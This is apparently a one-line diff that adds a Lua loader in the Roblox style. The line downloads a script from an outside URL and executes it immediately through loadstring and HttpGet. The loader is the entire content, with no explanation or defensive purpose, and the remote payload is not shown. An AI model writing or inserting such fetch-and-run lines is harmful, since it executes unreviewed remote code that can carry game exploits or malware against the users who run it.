@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://script.getambrion.space/getscript/695bd0de5abe0bb24578cd05', true))()
